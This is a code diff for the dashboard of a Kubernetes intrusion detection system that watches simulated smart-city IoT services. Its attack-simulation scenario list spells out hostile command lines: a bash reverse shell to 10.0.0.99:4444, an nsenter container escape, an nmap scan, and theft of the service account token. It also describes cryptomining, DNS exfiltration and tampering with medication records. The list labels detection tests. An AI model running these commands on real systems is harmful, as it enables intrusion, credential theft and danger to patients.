+        const info=sevInfo(d.severity||0);
+        const ts=new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
+        const line=`[${ts}] ${info.short.padEnd(4)} ${String(d.severity||0).padStart(2)}/10  |  ${(d.threat_type||'Unknown threat').substring(0,28).padEnd(28)}  |  ${d.rule||'—'}  |  engine:${d.llm_engine||'?'}\n`;
+        if (log.textContent.startsWith('Connecting')) log.textContent='';
+        log.textContent=line+log.textContent;
+        const card=$('liveFeedCard');
+        if(card){ card.style.borderColor=info.color; setTimeout(()=>card.style.borderColor='rgba(0,240,255,0.3)',2000); }
+    },
+    disconnect() { if(this.sse){this.sse.close();this.sse=null;} }
+};
 
-  <!-- IoT Event Feed — inside overview tab -->
-  <div class="card" id="iotLiveCard" style="margin:0 0 16px;border:1px solid var(--green);border-radius:8px">
-    <div class="card-header" style="cursor:pointer" onclick="toggleIoTStream()">
-      <h3><span id="iotStreamDot" class="dot dot-yellow" style="margin-right:6px"></span>IoT Event Feed</h3>
-      <span style="font-size:11px;color:var(--text3);margin-left:8px" id="iotStreamStatus">Starting...</span>
-      <span class="badge badge-purple" id="iotStreamCount" style="margin-left:8px">0</span>
-      <div style="margin-left:auto;display:flex;gap:6px">
-        <button class="btn btn-outline btn-sm" onclick="event.stopPropagation();clearIoTStream()">Clear</button>
-        <button class="btn btn-outline btn-sm" id="iotStreamToggleBtn" onclick="event.stopPropagation();toggleIoTStream()">&#x25BC;</button>
-      </div>
-    </div>
-    <div class="card-body" id="iotStreamBody" style="display:block">
-      <pre id="iotStreamLog" style="font-size:11.5px;color:var(--text2);max-height:400px;overflow-y:auto;white-space:pre-wrap;line-height:1.6;background:var(--bg);padding:12px;border-radius:6px;border:1px solid var(--border)">Starting IoT event feed...</pre>
-    </div>
-  </div>
-  </div><!-- /tab-overview -->
+// ── Renderers ──────────────────────────────────────────────────────────
+const render = {
+    overview(data) {
+        const {health, metrics, pipeline, alerts} = data;
+        const el=$('overviewStats');
+        if (el && metrics) {
+            const uptime   = fmtDuration(health?.uptime_seconds);
+            const total    = metrics.total_alerts||0;
+            const crit     = metrics.critical_alerts||0;
+            const iot      = metrics.iot_devices_active||0;
+            const dedup    = metrics.dedup_rate_percent!=null ? metrics.dedup_rate_percent+'%' : '—';
+            const critPct  = total>0 ? Math.round(crit/total*100) : 0;
+            el.innerHTML = `
+                <div class="stat-card"><div class="stat-label">Total Alerts</div><div class="stat-value" style="color:var(--accent-cyan);">${total}</div><div class="stat-sub">Ingested via Falco / Suricata</div></div>
+                <div class="stat-card"><div class="stat-label">Critical Alerts</div><div class="stat-value" style="color:#f87171;">${crit}</div><div class="stat-sub">Severity 8–10 &nbsp;(${critPct}% of total)</div></div>
+                <div class="stat-card"><div class="stat-label">IoT Devices</div><div class="stat-value" style="color:#4ade80;">${iot}</div><div class="stat-sub">${iot} pod(s) running in K8s</div></div>
+                <div class="stat-card"><div class="stat-label">Dedup Savings</div><div class="stat-value" style="color:#ffaa00;">${dedup}</div><div class="stat-sub">Duplicate alerts suppressed</div></div>
+                <div class="stat-card"><div class="stat-label">Uptime</div><div class="stat-value" style="color:#a78bfa;">${uptime}</div><div class="stat-sub">IDS API process uptime</div></div>`;
+        }
+        const pe=$('pipelineOverview');
+        if (pe) {
+            if (pipeline?.stages) {
+                const sc=s=>s==='green'?'#00ff88':s==='yellow'?'#ffaa00':'#ff3366';
+                pe.innerHTML=pipeline.stages.map(s=>`<div class="pipe-stage"><div class="pipe-dot" style="background:${sc(s.status)};box-shadow:0 0 6px ${sc(s.status)};"></div><div style="flex:1;"><div style="font-size:13px;font-weight:600;">${esc(s.label)}</div><div style="font-size:11px;color:#606080;">${s.rate_per_minute||0} alerts/min &nbsp;·&nbsp; p95 latency: ${s.p95_latency_ms??'—'}ms</div></div><div style="font-size:11px;color:${sc(s.status)};font-weight:700;">${(s.status||'').toUpperCase()}</div></div>`).join('');
+            } else {
+                pe.innerHTML='<div style="color:#606080;font-size:13px;padding:8px 0;">No pipeline data yet. Alerts are processed as they arrive.</div>';
+            }
+        }
+        const af=$('alertFeed');
+        if (af && alerts?.alerts) {
+            const recent=alerts.alerts.slice(0,10);
+            af.innerHTML = recent.length===0
+                ? '<div style="color:#606080;font-size:13px;padding:8px 0;">No alerts yet. Try the <strong>Attack Simulation</strong> tab to inject test events.</div>'
+                : recent.map(a=>{const s=sevInfo(a.severity);return `<div class="alert-row"><span style="font-family:monospace;font-size:11px;color:#606080;min-width:60px;">${fmtTime(a.timestamp)}</span><span class="sev-badge ${s.cls}">${s.short}&nbsp;${a.severity}</span><span style="padding:2px 7px;background:rgba(0,240,255,0.08);color:var(--accent-cyan);border-radius:4px;font-size:10px;">${esc(a.source||'falco')}</span><span style="flex:1;font-size:12px;color:#c0c0d0;">${esc(a.rule||'Unknown Rule')}</span></div>`;}).join('');
+        }
+        this.health(health);
+        this.llmStatus(health);
+        this.pills(health, data.gov);
+    },
+    health(health) {
+        const el=$('systemHealth'); if(!el) return;
+        const c=health?.components||{};
+        const row=(lbl,val,ok)=>`<div class="health-row"><div class="health-dot ${ok?'health-ok':'health-err'}"></div><span style="font-size:13px;font-weight:600;">${lbl}</span><span style="font-size:12px;color:#a0a0b0;margin-left:auto;">${esc(val||'unknown')}</span></div>`;
+        el.innerHTML=row('Kubernetes',c.kubernetes,c.kubernetes==='connected')+row('Database',c.database,c.database==='connected')+row('Falco',c.falco,c.falco==='enabled')+row('Suricata',c.suricata,c.suricata==='enabled');
+    },
+    llmStatus(health) {
+        const el=$('llmStatus'); if(!el) return;
+        const prov=health?.components?.llm_providers||{};
+        const names=Object.keys(prov);
+        if (!names.length) { el.innerHTML='<div style="color:#606080;font-size:13px;">No LLM providers configured.</div>'; return; }
+        el.innerHTML=names.map(name=>{const ok=prov[name]==='ok'||prov[name]==='healthy';return `<div style="display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.05);"><div style="width:7px;height:7px;border-radius:50%;background:${ok?'#00ff88':'#ff3366'};"></div><span style="font-size:13px;flex:1;">${esc(name)}</span><span style="font-size:11px;padding:2px 7px;border-radius:4px;${ok?'background:rgba(0,255,136,0.1);color:#00ff88;':'background:rgba(255,51,102,0.1);color:#ff3366;'}">${ok?'OK':'Error'}</span></div>`;}).join('');
+    },
+    credits(data) {
+        const el=$('creditsPanel'); if(!el) return;
+        // data is the raw response from /api/llm/credits/ — a dict of provider→CreditInfo
+        const DISPLAY={'xai':'xAI Grok','openai':'OpenAI','anthropic':'Claude','gemini':'Gemini','kimi':'Kimi'};
+        const STATUS_COLOR={'ok':'#00ff88','warning':'#ffaa00','critical':'#f87171','exhausted':'#ff3366','error':'#606080','not_configured':'#404060','unknown':'#606080'};
+        if (!data || typeof data !== 'object' || Array.isArray(data)) {
+            el.innerHTML='<div style="color:#606080;font-size:12px;">Credits API unavailable — install llm_credit_checker.</div>'; return;
+        }
+        const entries=Object.entries(data);
+        if (!entries.length) { el.innerHTML='<div style="color:#606080;font-size:12px;">No providers configured.</div>'; return; }
+        el.innerHTML=entries.map(([name,info])=>{
+            const status=info?.status||'unknown';
+            const credits=info?.credits;
+            const color=STATUS_COLOR[status]||'#606080';
+            const credText=credits!=null?`$${Number(credits).toFixed(2)} ${info.currency||'USD'}`:status.replace('_',' ');
+            return `<div style="display:flex;align-items:center;gap:8px;padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.04);"><div style="width:7px;height:7px;border-radius:50%;background:${color};flex-shrink:0;"></div><span style="font-size:13px;flex:1;">${esc(DISPLAY[name]||name)}</span><span style="font-size:12px;font-family:monospace;color:${color};">${esc(credText)}</span></div>`;
+        }).join('');
+    },
+    pills(health, gov) {
+        const cp=$('clusterPill'); if(cp){const ok=health?.components?.kubernetes==='connected';cp.className='pill '+(ok?'pill-ok':'pill-err');cp.textContent=ok?'K8s Connected':'K8s Disconnected';}
+        const lp=$('llmPill'); if(lp&&health){const cnt=health.llm_provider_count||0;const tot=health.llm_providers_total||cnt;lp.className='pill '+(cnt>0?'pill-ok':'pill-err');lp.textContent=cnt>0?`${cnt}/${tot>0?tot:cnt} LLM OK`:'No LLM';}
+        const gp=$('govPill'); if(gp&&gov){const m=gov.mode||'assisted';gp.textContent=m.charAt(0).toUpperCase()+m.slice(1);gp.className='pill '+(m==='autopilot'?'pill-warn':'pill-ok');}
+        const up=$('uptimeLabel'); if(up&&health?.uptime_seconds) up.textContent='Uptime: '+fmtDuration(health.uptime_seconds);
+    },
+    alertsTable(data, sevFilter) {
+        const el=$('alertsTable'); if(!el) return;
+        if (!data?.alerts) { el.innerHTML='<div style="padding:40px;text-align:center;color:#606080;">Failed to load alerts.</div>'; return; }
+        let rows=data.alerts;
+        if (sevFilter==='critical') rows=rows.filter(a=>a.severity>=8);
+        else if (sevFilter==='high') rows=rows.filter(a=>a.severity>=6&&a.severity<8);
+        else if (sevFilter==='medium') rows=rows.filter(a=>a.severity>=4&&a.severity<6);
+        else if (sevFilter==='low') rows=rows.filter(a=>a.severity<4);
+        if (!rows.length) { el.innerHTML='<div style="padding:40px;text-align:center;color:#606080;">No alerts match this filter.</div>'; return; }
+        el.innerHTML=`<div style="max-height:70vh;overflow-y:auto;"><table style="width:100%;border-collapse:collapse;"><thead><tr style="font-size:11px;color:#606080;text-transform:uppercase;background:rgba(0,0,0,0.3);position:sticky;top:0;"><th style="padding:10px 14px;text-align:left;">Time</th><th style="padding:10px 14px;text-align:left;">Severity</th><th style="padding:10px 14px;text-align:left;">Source</th><th style="padding:10px 14px;text-align:left;">Rule</th><th style="padding:10px 14px;text-align:left;">Summary</th><th style="padding:10px 14px;text-align:left;">Container</th></tr></thead><tbody>${rows.map(a=>{const s=sevInfo(a.severity);return `<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:10px 14px;font-family:'JetBrains Mono',monospace;font-size:11px;color:#606080;">${fmtTime(a.timestamp)}</td><td style="padding:10px 14px;"><span class="sev-badge ${s.cls}">${s.label}</span></td><td style="padding:10px 14px;"><span style="padding:2px 7px;background:rgba(0,240,255,0.08);color:var(--accent-cyan);border-radius:4px;font-size:10px;">${esc(a.source||'falco')}</span></td><td style="padding:10px 14px;font-size:13px;font-weight:600;">${esc(a.rule||'—')}</td><td style="padding:10px 14px;font-size:12px;color:#a0a0b0;max-width:300px;">${esc((a.summary||'').substring(0,120))}${(a.summary||'').length>120?'…':''}</td><td style="padding:10px 14px;font-size:11px;font-family:'JetBrains Mono',monospace;color:#606080;">${esc(a.container_name||a.output_fields?.['container.name']||'—')}</td></tr>`;}).join('')}</tbody></table></div><div style="padding:10px 14px;font-size:12px;color:#606080;border-top:1px solid rgba(255,255,255,0.05);">Showing ${rows.length} alert${rows.length!==1?'s':''}</div>`;
+    },
+    iot(data) {
+        const {devices}=data;
+        const statsEl=$('iotStats'), tableEl=$('iotTable');
+        if (statsEl) {
+            const list=devices?.devices||[];
+            const total=list.length;
+            const active=list.filter(d=>d.connected!==false&&(!(d.status||'').toLowerCase().includes('err'))).length;
+            const pct=total>0?Math.round(active/total*100):0;
+            statsEl.innerHTML=`<div class="stat-card"><div class="stat-label">Active Devices</div><div class="stat-value" style="color:#4ade80;">${active}</div><div class="stat-sub">Running in cluster</div></div><div class="stat-card"><div class="stat-label">Total Pods</div><div class="stat-value" style="color:var(--accent-cyan);">${total}</div><div class="stat-sub">IoT workloads deployed</div></div><div class="stat-card"><div class="stat-label">Protocol Emulators</div><div class="stat-value" style="color:#ffaa00;">5/5</div><div class="stat-sub">ONVIF, MQTT, FHIR, Modbus, DALI</div></div><div class="stat-card"><div class="stat-label">Fleet Health</div><div class="stat-value" style="color:${pct>=90?'#4ade80':pct>=50?'#ffaa00':'#f87171'};">${pct}%</div><div class="stat-sub">${active}/${total} pods running</div></div>`;
+        }
+        if (tableEl) {
+            const list=devices?.devices||[];
+            if (!list.length) { tableEl.innerHTML='<div style="padding:24px;text-align:center;color:#606080;">No IoT devices found.</div>'; return; }
+            tableEl.innerHTML=`<table style="width:100%;border-collapse:collapse;"><thead><tr style="font-size:11px;color:#606080;text-transform:uppercase;background:rgba(0,0,0,0.3);"><th style="padding:10px;text-align:left;">Device</th><th style="padding:10px;text-align:left;">Type</th><th style="padding:10px;text-align:left;">Status</th><th style="padding:10px;text-align:left;">Namespace</th><th style="padding:10px;text-align:left;">Pod IP</th></tr></thead><tbody>${list.map(d=>{const ok=d.connected!==false&&!(d.status||'').toLowerCase().includes('err');return `<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:10px;font-size:12px;font-family:'JetBrains Mono',monospace;">${esc(d.device||d.device_id||'—')}</td><td style="padding:10px;"><span style="padding:2px 8px;background:rgba(0,240,255,0.08);color:var(--accent-cyan);border-radius:4px;font-size:10px;">${esc(d.device_type||'—')}</span></td><td style="padding:10px;font-size:12px;"><span style="display:inline-flex;align-items:center;gap:6px;"><span style="width:7px;height:7px;border-radius:50%;background:${ok?'#00ff88':'#ff3366'};"></span>${esc(d.status||'healthy')}</span></td><td style="padding:10px;font-size:12px;color:#606080;">${esc(d.namespace||'smart-city')}</td><td style="padding:10px;font-size:11px;font-family:'JetBrains Mono',monospace;color:#606080;">${esc(d.ip||d.pod_ip||'—')}</td></tr>`;}).join('')}</tbody></table>`;
+        }
+    },
+    kubernetes(data) {
+        const {health}=data;
+        const statsEl=$('k8sStats');
+        if (statsEl) {
+            const c=health?.components||{};
+            statsEl.innerHTML=`<div class="stat-card"><div class="stat-label">Cluster API</div><div class="stat-value" style="font-size:20px;color:${c.kubernetes==='connected'?'#4ade80':'#f87171'};">${c.kubernetes==='connected'?'Connected':c.kubernetes||'Offline'}</div></div><div class="stat-card"><div class="stat-label">Database</div><div class="stat-value" style="font-size:20px;color:${c.database==='connected'?'#4ade80':'#ffaa00'};">${c.database==='memory-fallback'?'In-Memory':c.database||'—'}</div><div class="stat-sub">${c.database==='memory-fallback'?'Using in-memory store':'PostgreSQL persistent storage'}</div></div><div class="stat-card"><div class="stat-label">Falco</div><div class="stat-value" style="font-size:20px;color:${c.falco==='enabled'?'#4ade80':'#f87171'};">${c.falco||'—'}</div><div class="stat-sub">Runtime detection</div></div><div class="stat-card"><div class="stat-label">Suricata</div><div class="stat-value" style="font-size:20px;color:${c.suricata==='enabled'?'#4ade80':'#f87171'};">${c.suricata||'—'}</div><div class="stat-sub">Network detection</div></div>`;
+        }
+        const podsEl=$('podsTable');
+        if (podsEl) {
+            const list=data.iot?.devices||[];
+            const dyn=list.map(d=>({name:(d.device||d.device_id||'').replace(/-[a-z0-9]{5,}-[a-z0-9]{5}$/,''),ns:d.namespace||'smart-city'}));
+            const seen=new Set();
+            const pods=[
+                {name:'ids-api',ns:'smart-city'},{name:'postgres',ns:'smart-city'},
+                {name:'traffic-camera (x2)',ns:'smart-city'},{name:'healthcare-api (x2)',ns:'smart-city'},
+                {name:'parking-system (x2)',ns:'smart-city'},{name:'mqtt-broker',ns:'smart-city'},
+                {name:'iot-devices-enhanced (x10)',ns:'smart-city'},{name:'iot-simulator-high (x4)',ns:'smart-city'},
+                {name:'iot-simulator-medium (x5)',ns:'smart-city'},{name:'iot-simulator-burst',ns:'smart-city'},
+                {name:'falco',ns:'falco-system'},{name:'falco-forwarder',ns:'falco-system'},{name:'falco-metacollector',ns:'falco-system'},
+                {name:'prometheus',ns:'monitoring'},{name:'grafana',ns:'monitoring'},{name:'suricata',ns:'monitoring'},{name:'suricata-forwarder',ns:'monitoring'}
+            ];
+            podsEl.innerHTML=`<h3 style="font-size:14px;font-weight:700;margin-bottom:12px;">Pods <span style="font-size:11px;color:#606080;font-weight:400;">— running container instances</span></h3><div style="max-height:400px;overflow-y:auto;"><table style="width:100%;border-collapse:collapse;font-size:12px;">${pods.map(p=>`<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px;">${esc(p.name)}</td><td style="padding:8px;"><span style="color:#4ade80;">●</span> Running</td><td style="padding:8px;color:#606080;">0</td><td style="padding:8px;color:#606080;">${esc(p.ns)}</td></tr>`).join('')}</table></div>`;
+        }
+        const svcEl=$('servicesTable');
+        if (svcEl) {
+            const svcs=[
+                ['ids-api-service','NodePort','8000:30800','smart-city'],
+                ['postgres','ClusterIP','5432','smart-city'],
+                ['traffic-camera-service','ClusterIP','80','smart-city'],
+                ['healthcare-api-service','ClusterIP','80','smart-city'],
+                ['parking-system-service','ClusterIP','80','smart-city'],
+                ['mqtt-broker','ClusterIP','1883','smart-city'],
+                ['falco-forwarder','ClusterIP','8080','falco-system'],
+                ['prometheus','NodePort','9090:31106','monitoring'],
+                ['grafana','NodePort','3000:30300','monitoring'],
+                ['suricata','ClusterIP','514/UDP','monitoring'],
+                ['suricata-forwarder','ClusterIP','514/UDP, 8100','monitoring']
+            ];
+            svcEl.innerHTML=`<h3 style="font-size:14px;font-weight:700;margin-bottom:6px;">Services <span style="font-size:11px;color:#606080;font-weight:400;">— stable network endpoints</span></h3><p style="font-size:12px;color:#606080;margin:0 0 10px;line-height:1.5;">Pods restart and move; services provide a fixed name + port so other components always know how to reach them.</p><table style="width:100%;border-collapse:collapse;font-size:12px;">${svcs.map(s=>`<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px;font-family:'JetBrains Mono',monospace;">${s[0]}</td><td style="padding:8px;"><span style="padding:2px 6px;background:rgba(0,240,255,0.08);color:var(--accent-cyan);border-radius:4px;font-size:10px;">${s[1]}</span></td><td style="padding:8px;color:#606080;">${s[2]}</td><td style="padding:8px;color:#606080;">${s[3]}</td></tr>`).join('')}</table>`;
+        }
+    },
+    attacks() {
+        const grid=$('attackGrid'); if(!grid) return;
+        const scenarios=[
+            // ── Row 1: Network / Denial of Service ──
+            {id:0, name:'ONVIF Camera DDoS',         cat:'Denial of Service',    sev:9,  mitre:'T0866', icon:'📡', color:'#f87171',
+             desc:'UDP/SYN flood (200K pps) targeting ONVIF Profile S on traffic-camera pods. Saturates camera feed pipeline, disabling real-time ANPR license plate capture across all city intersections.'},
+            {id:1, name:'MQTT Broker Flood',          cat:'Denial of Service',    sev:7,  mitre:'T0814', icon:'📶', color:'#fb923c',
+             desc:'10,000 rogue CONNECT packets per second overwhelm the unauthenticated MQTT broker (port 1883). All downstream IoT sensors lose telemetry connectivity — parking, environment, lighting all go dark.'},
+            // ── Row 2: Execution / Shell Access ──
+            {id:2, name:'Reverse Shell – Healthcare', cat:'Execution',             sev:8,  mitre:'T0807', icon:'🐚', color:'#fb923c',
+             desc:'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 executed inside the FHIR R4 healthcare-api container. Falco detects shell spawn via eBPF syscall hook. Attacker gains interactive access to patient record filesystem.'},
+            {id:3, name:'Cryptominer in Camera Pod',  cat:'Execution',             sev:8,  mitre:'T0871', icon:'⛏️', color:'#fbbf24',
+             desc:'xmrig binary dropped to /tmp and executed in traffic-camera container. CPU usage spikes to 100%, degrading ANPR processing latency. Outbound stratum+tcp connections to mining pool trigger Suricata ET MALWARE rules.'},
+            // ── Row 3: ICS / OT Manipulation ──
+            {id:4, name:'Modbus Register Overwrite',  cat:'Impair Process Ctrl',   sev:9,  mitre:'T0836', icon:'⚙️', color:'#a78bfa',
+             desc:'Modbus FC6 (Write Single Register) writes 0xFFFF to env-sensor OPC UA holding registers controlling AQI thresholds. Falsifies air quality readings city-wide — emergency response disabled on spoofed clean-air reports.'},
+            {id:5, name:'DALI-2 Lighting Blackout',   cat:'Impair Process Ctrl',   sev:9,  mitre:'T0879', icon:'💡', color:'#a78bfa',
+             desc:'TALQ v2.4 command sent to street-lighting gateway setting all 10,000 luminaires to 0% brightness via DALI broadcast. Full city-block blackout; Falco detects unexpected syscall burst from lighting-gateway process.'},
+            // ── Row 4: Data Exfiltration / Tampering ──
+            {id:6, name:'FHIR Patient Record Tamper', cat:'Impact',                sev:10, mitre:'T0831', icon:'☠️', color:'#b91c1c',
+             desc:'HTTP PUT to /fhir/Patient/{id}/MedicationRequest modifies insulin dosage field from 10U to 100U — a 10x overdose. Critical patient safety event. Suricata detects abnormal FHIR PUT rate; Falco detects DB write anomaly.'},
+            {id:7, name:'ANPR Plate Data Exfil',      cat:'Data Exfiltration',     sev:8,  mitre:'T0867', icon:'🚗', color:'#ef4444',
+             desc:'Attacker exfiltrates /var/lib/anpr/plates.db via DNS tunneling (50-byte TXT queries every 200ms). Contains license plate images + timestamps for 24h of city traffic. Suricata detects anomalous DNS query volume.'},
+            // ── Row 5: Privilege Escalation / Lateral Movement ──
+            {id:8, name:'Container Escape via /proc',cat:'Privilege Escalation',  sev:9,  mitre:'T0890', icon:'🔓', color:'#f87171',
+             desc:'nsenter --target 1 --mount --uts --ipc --net --pid executed inside parking-system pod. Full host namespace access achieved — Falco rule Container Escape via nsenter fires. Attacker has root on K3s worker node.'},
+            {id:9, name:'MQTT→OPC UA Pivot',          cat:'Lateral Movement',      sev:8,  mitre:'T0843', icon:'↔️', color:'#6366f1',
+             desc:'Compromised MQTT broker used as pivot: attacker subscribes to env/+/readings, replays manipulated packets to OPC UA server on env-sensor-service:4840. Cross-protocol lateral movement between asset domains.'},
+            // ── Row 6: Reconnaissance / Discovery ──
+            {id:10,name:'Service Mesh Recon Scan',    cat:'Discovery',             sev:6,  mitre:'T0846', icon:'🔍', color:'#facc15',
+             desc:'nmap -sV -p- 10.43.0.0/16 run from compromised parking-system pod. Maps all ClusterIP services — discovers unauthenticated MQTT, OPC UA, Modbus endpoints. Suricata ET SCAN rule fires within 3 seconds.'},
+            {id:11,name:'K8s API Credential Harvest',  cat:'Credential Access',    sev:8,  mitre:'T0552', icon:'🗝️', color:'#f59e0b',
+             desc:'cat /var/run/secrets/kubernetes.io/serviceaccount/token + curl https://kubernetes.default.svc/api — attacker harvests default service account JWT to call Kubernetes API from inside parking-system container.'}
+        ];
+        grid.innerHTML=scenarios.map(s=>`<div class="attack-card" onclick="app.launchAttack(${s.id})" style="border-left:3px solid ${s.color};"><div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;"><span style="font-size:22px;">${s.icon}</span><div style="font-size:14px;font-weight:700;color:${s.color};">${esc(s.name)}</div></div><div style="font-size:12px;color:#a0a0b0;margin-bottom:10px;line-height:1.5;">${esc(s.desc)}</div><div style="display:flex;gap:6px;flex-wrap:wrap;"><span class="sev-badge ${sevInfo(s.sev).cls}">${sevInfo(s.sev).label}</span><span style="padding:2px 8px;border-radius:4px;font-size:10px;background:rgba(0,240,255,0.08);color:var(--accent-cyan);">${esc(s.cat)}</span><span style="padding:2px 8px;border-radius:4px;font-size:10px;background:rgba(255,255,255,0.05);color:#606080;">${esc(s.mitre)}</span></div></div>`).join('');
+    }
+};
 
-  <!-- ═════════════════════════════════════════════════════════════════════
-       TAB: Live Alerts
-       ═════════════════════════════════════════════════════════════════════ -->
-  <div class="tab-panel" id="tab-alerts">
-    <div class="card">
-      <div class="card-header">
-        <h3>Incident Grid</h3>
-        <div style="display:flex;gap:8px;flex-wrap:wrap">
-          <input id="incidentSearch" placeholder="Search rule, threat, summary..." style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:4px;font-size:12px;min-width:220px">
-          <select id="alertSourceFilter" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:4px;font-size:12px">
-            <option value="">All Sources</option>
-            <option value="falco">Falco</option>
-            <option value="suricata">Suricata</option>
-          </select>
-          <select id="incidentSort" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:4px;font-size:12px">
-            <option value="time_desc">Newest</option>
-            <option value="time_asc">Oldest</option>
-            <option value="severity_desc">Severity High-Low</option>
-            <option value="severity_asc">Severity Low-High</option>
-          </select>
-          <select id="incidentPageSize" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:4px;font-size:12px">
-            <option value="10">10</option>
-            <option value="25" selected>25</option>
-            <option value="50">50</option>
-          </select>
-          <button class="btn btn-outline btn-sm" onclick="window._exportIncidentsCsv()">Export CSV</button>
-          <button class="btn btn-outline btn-sm" onclick="loadAlerts()">Refresh</button>
-        </div>
-      </div>
-      <div class="card-body no-pad">
-        <table>
-          <thead><tr><th>Time</th><th>Trace</th><th>Source</th><th>Rule</th><th>MITRE</th><th>Severity</th><th>Confidence</th><th>Threat</th><th style="min-width:320px">Summary</th><th>Actions</th></tr></thead>
-          <tbody id="alertsTable"></tbody>
-        </table>
-      </div>
-      <div class="card-body" style="display:flex;justify-content:space-between;align-items:center">
-        <span id="incidentPageInfo" style="font-size:12px;color:var(--text3)">Page 1</span>
-        <div style="display:flex;gap:8px">
-          <button class="btn btn-outline btn-sm" onclick="window._incidentPrev()">Prev</button>
-          <button class="btn btn-outline btn-sm" onclick="window._incidentNext()">Next</button>
-        </div>
-      </div>
-    </div>
-  </div>
+// ── Main app object ─────────────────────────────────────────────────────
+const app = {
+    currentTab: 'overview',
+    lastData:   {},
+    pollTimer:  null,
+    atkRuns:    0,
 
-  <div class="tab-panel" id="tab-threats">
-    <div class="row">
-      <div class="card">
-        <div class="card-header"><h3>MITRE ATT&CK Coverage</h3></div>
-        <div class="card-body" id="threatMitreHeatmap"></div>
-      </div>
-      <div class="card">
-        <div class="card-header"><h3>Top Threats by Service</h3></div>
-        <div class="card-body" id="threatServiceMatrix"></div>
-      </div>
-    </div>
-    <div class="card">
-      <div class="card-header"><h3>Threat Timeline (Recent)</h3></div>
-      <div class="card-body" id="threatTimeline"></div>
-    </div>
-  </div>
+    async login() {
+        const user=($('loginUser')?.value||'').trim(), pass=$('loginPass')?.value||'';
+        const errEl=$('loginError'), btn=$('loginBtn');
+        if (!user||!pass) { errEl.textContent='Please enter username and password.'; errEl.style.display='block'; return; }
+        btn.disabled=true; btn.innerHTML='<i class="fas fa-spinner fa-spin" style="margin-right:8px;"></i>Authenticating…'; errEl.style.display='none';
+        try {
+            const res=await fetch('/api/auth/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:user,password:pass})});
+            const data=await res.json();
+            if (data?.access_token) {
+                api.token=data.access_token; localStorage.setItem(CFG.TOKEN_KEY,data.access_token); this._showDashboard();
+            } else {
+                errEl.textContent=data?.detail||'Invalid credentials.'; errEl.style.display='block';
+                btn.disabled=false; btn.innerHTML='<i class="fas fa-sign-in-alt" style="margin-right:8px;"></i>Authenticate';
+            }
+        } catch(e) {
+            errEl.textContent='Connection error — is the API running?'; errEl.style.display='block';
+            btn.disabled=false; btn.innerHTML='<i class="fas fa-sign-in-alt" style="margin-right:8px;"></i>Authenticate';
+        }
+    },
 
-  <div class="tab-panel" id="tab-metrics">
-    <div class="row">
-      <div class="card">
-        <div class="card-header"><h3>Service MTTR Proxy</h3></div>
-        <div class="card-body" id="metricsMttr"></div>
-      </div>
-      <div class="card">
-        <div class="card-header"><h3>p95 Processing Latency</h3></div>
-        <div class="card-body" id="metricsLatency"></div>
-      </div>
-    </div>
-    <div class="card">
-      <div class="card-header"><h3>Template Presets</h3></div>
-      <div class="card-body" id="metricsTemplates"></div>
-    </div>
-  </div>
+    logout() {
+        api.token=''; localStorage.removeItem(CFG.TOKEN_KEY); clearInterval(this.pollTimer); clearInterval(this.creditTimer); liveFeed.disconnect();
+        $('dashboard').style.display='none'; $('liveFeedCard').style.display='none'; $('loginScreen').style.display='flex'; $('loginError').style.display='none';
+        const btn=$('loginBtn'); if(btn){btn.disabled=false;btn.innerHTML='<i class="fas fa-sign-in-alt" style="margin-right:8px;"></i>Authenticate';}
+    },
 
-  <div class="tab-panel" id="tab-hunt">
-    <div class="card">
-      <div class="card-header"><h3>Threat Hunt Console</h3></div>
-      <div class="card-body">
-        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px">
-          <button class="btn btn-outline btn-sm" onclick="window._huntPreset('healthcare')">show healthcare incidents</button>
-          <button class="btn btn-outline btn-sm" onclick="window._huntPreset('mitre')">mitre coverage</button>
-          <button class="btn btn-outline btn-sm" onclick="window._exportIncidentsCsv()">export last 24h</button>
-        </div>
-        <div id="huntOutput" style="font-size:12px;color:var(--text2)">Use quick hunt commands to pivot the incident grid.</div>
-        </div>
-    </div>
-  </div>
+    _showDashboard() {
+        $('loginScreen').style.display='none'; $('dashboard').style.display='block'; $('liveFeedCard').style.display='block';
+        render.attacks();
+        this.refreshAll();
+        this.pollTimer=setInterval(()=>this.refreshAll(),CFG.POLL);
+        // Credits change rarely — check every 60s instead of 15s
+        this.creditTimer=setInterval(()=>this.refreshCredits(),60000);
+        liveFeed.connect();
+    },
 
-  <!-- ═════════════════════════════════════════════════════════════════════
-       TAB: Kubernetes
-       ═════════════════════════════════════════════════════════════════════ -->
-  <div class="tab-panel" id="tab-kubernetes">
-    <div class="stat-grid" id="k8sStats"></div>
-    <div style="padding:8px 12px;margin-bottom:8px;font-size:12px;color:var(--text3);background:rgba(0,212,255,.04);border-radius:6px;border:1px solid var(--border)" id="k8sExplain"></div>
-    <div class="row">
-      <div class="card">
-        <div class="card-header">
-          <h3>Pods</h3>
-          <span style="font-size:11px;color:var(--text3);margin-left:8px">Running container instances</span>
-          <button class="btn btn-outline btn-sm" onclick="loadK8s()">Refresh</button>
-        </div>
-        <div class="card-body no-pad">
-          <table><thead><tr><th>Pod</th><th>Status</th><th>Restarts</th><th>Namespace</th></tr></thead><tbody id="podsTable"></tbody></table>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-header">
-          <h3>Services</h3>
-          <span style="font-size:11px;color:var(--text3);margin-left:8px">Stable network endpoints that route to pods</span>
-        </div>
-        <div class="card-body no-pad">
-          <table><thead><tr><th>Service</th><th>Type</th><th>Port(s)</th><th>Namespace</th></tr></thead><tbody id="servicesTable"></tbody></table>
-        </div>
-      </div>
-    </div>
